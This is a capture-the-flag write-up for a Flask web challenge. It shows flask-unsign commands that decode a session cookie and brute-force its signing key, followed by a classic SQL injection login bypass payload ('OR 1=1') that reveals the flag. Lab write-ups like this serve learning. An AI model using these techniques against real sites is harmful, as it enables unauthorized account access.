    <summary>The dead cookie end</summary>
Looked at alot of different possible exploits. Started off with looking at the webserver "python-werkzeug" which was version 2.0.2 (quite old) and is supposed to only be used in a dev envireoment. Found some exploits related to debug mode and the "/console" path, but that was not enabled.

The app has a form that is posted to "/login". In the response you are redirected to "/" and told to set a cookie.

I started looking at the Set-Cookie response from the webserver since it seemed that there was some logic related to it. ("login failed" appeard when you presented the cookie)

Turns out Flask has its own session handling system. You can read the session variables by using flask-unsign:
```
(python) h@flakse:~/git/SiktCTF-2024/Web/squire/python$ flask-unsign -d -c eyJfZmxhc2hlcyI6W3siIHQiOlsiZXJyb3IiLCJMb2dpbiBmYWlsZWQhIl19XX0.ZwrjKA.AGDduQlwNvuV6B8RXOKaXFnQKXY
{'_flashes': [('error', 'Login failed!')]}
(python) h@flakse:~/git/SiktCTF-2024/Web/squire/python$ 
```
I stumbled upon [this](https://ldvargas.medium.com/hackpackctf-cookie-forge-3d922862d383) site when googling for more information. In that writeup they brute-force the key used for signing the cookie. After recovering the key they can sign their own, evil, cookie and the server will accept it.

I decided to try bruteforcing myself:
```
(python) h@flakse:~/git/SiktCTF-2024/Web/squire/python$ flask-unsign -u -c eyJfZmxhc2hlcyI6W3siIHQiOlsiZXJyb3IiLCJMb2dpbiBmYWlsZWQhIl19XX0.ZwrjKA.AGDduQlwNvuV6B8RXOKaXFnQKXY
[*] Session decodes to: {'_flashes': [('error', 'Login failed!')]}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----ECR
[+] Found secret key after 21760 attemptsastHlWgH4UWQ
'supersecretkey'
(python) h@flakse:~/git/SiktCTF-2024/Web/squire/python$ 
```

We got the secret!! "supersecretkey" ðŸ¥³

Now we just need to figure out what a successful login cookie looks like.

<h3>Or so i thought...</h3>

Turns out this was a dead end. After many hours i trying random fields in the cookie i started to look elsewhere. By unlocking a hint i knew i needed to look for SQL injections on the site

![SQL injection](image-1.png)'

After som trial and error i noticed that i would get a 500 response code if i had "admin" as username and " ' " as password. Changing out admin for another name did not result in a 500, so i was on to something.

I ended up trying a lot of different SQL Injection examples and eventually found this one:
``` 
username=admin&password=' OR '1'='1' --
```

Suddenly the server responded with the following:
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 599
Vary: Cookie
Server: Werkzeug/2.0.2 Python/3.9.19

Loading the refrenced "/static/success.gif" gave me a gif with the flag!
